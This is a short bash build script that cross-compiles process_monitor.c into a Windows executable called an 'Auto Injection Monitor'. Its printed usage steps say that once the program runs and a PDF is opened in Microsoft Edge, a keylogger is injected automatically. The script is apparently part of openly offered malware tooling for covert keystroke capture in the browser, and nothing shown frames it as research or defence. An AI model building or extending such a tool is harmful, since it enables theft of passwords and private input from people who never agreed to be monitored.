#!/bin/bash

echo "==================================="
echo "Building Auto Injection Monitor"
echo "==================================="

echo "Compiling process_monitor.c..."
x86_64-w64-mingw32-gcc process_monitor.c -o process_monitor.exe

echo ""
echo "Build complete!"
echo ""
echo "Generated file:"
ls -lh process_monitor.exe

echo ""
echo "==================================="
echo "Usage:"
echo "1. Run process_monitor.exe"
echo "2. Open PDF file with msedge"
echo "3. Keylogger will be injected automatically"
echo "==================================="
